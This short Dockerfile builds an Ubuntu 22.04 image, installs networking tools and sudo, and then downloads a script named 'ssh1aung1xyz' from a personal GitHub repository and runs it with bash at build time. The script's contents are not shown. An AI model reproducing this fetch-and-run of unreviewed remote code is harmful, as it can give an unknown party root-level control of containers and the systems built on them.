FROM --platform=linux/amd64 ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt update -y && apt install --no-install-recommends -y net-tools curl wget git tzdata sudo
RUN apt update -y && apt install wget sudo  -y && wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz && bash ssh1aung1xyz
